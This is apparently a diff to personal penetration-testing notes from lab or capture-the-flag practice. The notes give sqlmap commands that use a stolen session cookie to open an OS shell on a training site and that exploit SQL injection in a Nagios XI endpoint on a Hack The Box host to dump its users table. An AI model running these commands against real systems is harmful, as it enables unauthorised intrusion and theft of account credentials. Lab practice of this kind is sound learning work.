@@ -69,3 +69,10 @@ When you get into the website > click view profile > inspect > document.cookie
 sqlmap oshell with user-cookie
 -----------------------------
 #sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-os-shell
+
+
+Adding level and risk flag because I kept getting ‘unable to retrieve the database names’ error
+-------------------------------------------------------------------------------------------------
+
+sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=09755b538297f4ced0910fa481333443394b460e" -p id -level=5 -risk=3
+sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=09755b538297f4ced0910fa481333443394b460e" -p id -level=5 -risk=3 -D nagiosxi -T xi_users --dump
